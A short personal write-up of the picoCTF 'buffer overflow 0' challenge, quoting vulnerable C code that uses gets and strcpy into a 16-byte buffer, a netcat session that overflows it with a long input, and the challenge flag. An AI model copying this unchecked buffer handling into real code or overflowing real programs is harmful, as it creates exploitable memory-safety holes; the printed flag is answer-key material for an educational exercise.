# buffer overflow  0

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`

There was a problem in OASIS (the asteroid one) which followed the same principle so i had somewhat of an idea of what to do this time arround

I saw the C code and found the use of many buffers as well as the gets function


```
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

```
```

  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler

```
```
  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

So the first thing i thought was to Input a large string and it worked

```
blue@BlueKnight:~/ctf/buffer overflow 0$ nc saturn.picoctf.net 56940
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

What you learned through solving this challenge:

1. Basics of how stacks work and what a buffer overflow is
2. How to cause a buffer overflow
